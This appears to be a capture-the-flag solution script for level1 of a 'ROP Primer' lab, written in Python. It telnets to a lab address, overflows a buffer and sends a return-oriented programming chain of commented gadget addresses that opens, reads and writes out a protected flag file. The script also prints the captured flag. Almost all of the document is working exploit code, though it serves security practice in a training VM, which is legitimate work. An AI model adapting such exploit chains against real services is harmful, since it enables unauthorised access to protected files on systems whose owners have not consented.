ROP Primer - level1 (shodan)

NB: I *think* the permissions on the /home/level1 folder need to include browse (x) permissions for this level to work.

First ROP chain simple opens, reads and then writes the 'flag' file

Usage:
python ./rop_primer1-0.py
flag{just_one_rop_chain_a_day_keeps_the_doctor_away}



import telnetlib
import struct


IP = '192.168.56.102'
PORT = 8888

FLAG = b'/home/level1/flag\x00'
# FLAG = b'./flag\x00'
FLAG_MEM_ADDR = '0x804b008'

# BKPT = 0x8048d18

def send_to_host(tn_obj, exploit):
    tn_obj.read_until(b'exit.\n\n>')
    tn_obj.write(b'store')
    tn_obj.read_until(b'file?\n\n')
    tn_obj.write(b'128')
    tn_obj.read_until(b'file:\n\n')
    tn_obj.write(FLAG + b'A' * (128 - len(FLAG)))
    tn_obj.read_until(b'filename:\n')
    tn_obj.write(exploit)
    tn_obj.write(b'\n')
    data = tn_obj.read_until(b'\n')
    return data

tn = telnetlib.Telnet(IP, PORT)
# tn.set_debuglevel(5)


# shellcode = b'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAf'
shellcode = b'B' * 64                               # padding
shellcode += struct.pack('I', 0x80486d0)            # open syscall
shellcode += struct.pack('I', 0x8048ef7)            # pop edi, pop ebp, ret
shellcode += struct.pack('I', 0x804b008)            # FLAG_MEM_ADDR
shellcode += struct.pack('I', 0x00000000)           # Readonly flag for open
shellcode += struct.pack('I', 0x8048640)            # read syscall
shellcode += struct.pack('I', 0x8048ef6)            # pop edi, pop ebp, pop esi, ret
shellcode += struct.pack('I', 0x00000003)           # Turns out it is the 3rd FD
shellcode += struct.pack('I', 0x804b008 + len(FLAG))    # Buffer to read into
shellcode += struct.pack('I', 0x00000040)           # 32 bytes should be enough....
shellcode += struct.pack('I', 0x8048700)            # Write syscall
shellcode += struct.pack('I', 0x8048ef6)            # pop edi, pop ebp, pop esi, ret
shellcode += struct.pack('I', 0x00000004)           # Turns out it is the 3rd FD
shellcode += struct.pack('I', 0x804b008 + len(FLAG))    # Buffer to read into
shellcode += struct.pack('I', 0x00000040)           # 32 bytes should be enough....
shellcode += b'AAAABBBBCCCCDDDDEEEE'

print(send_to_host(tn, shellcode)[2:])